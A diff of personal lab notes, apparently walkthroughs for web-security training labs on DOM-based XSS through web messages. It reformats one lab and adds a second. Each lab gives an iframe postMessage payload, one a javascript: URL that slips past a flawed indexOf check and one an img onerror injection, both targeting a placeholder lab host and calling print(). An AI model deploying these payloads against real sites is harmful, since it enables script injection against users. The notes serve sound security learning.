@@ -22,11 +22,22 @@ If u find any of the above things in the source code of the website then there i
 
 #1 Lab:  DOM XSS using web messages and a JavaScript URL
 
-    1.  Notice that the home page contains an addEventListener() call that listens for a web message. 
-        The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. 
-        It also contains the sink location.href.
-    2. Go to exploit server and add the following payload,
+    1.Notice that the home page contains an addEventListener() call that listens for a web message. 
+      The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. 
+      It also contains the sink location.href.
+    2.Go to exploit server and add the following payload,
        <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 
 
 ----------------------------------------------------------------------------------------------------------------------------
+
+#2 Lab: DOM XSS using web messages
+
+    1.In console type window.postMessage('Hello hacker'); and see the response in console.
+    It means that the website is accepting web messages and there is a possibility of DOM XSS vulnerability.
+    2.Go to exploit server and add the following payload,
+       <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+    and lab is solved.
+
+------------------------------------------------------------------------------------------------------------------------------
+
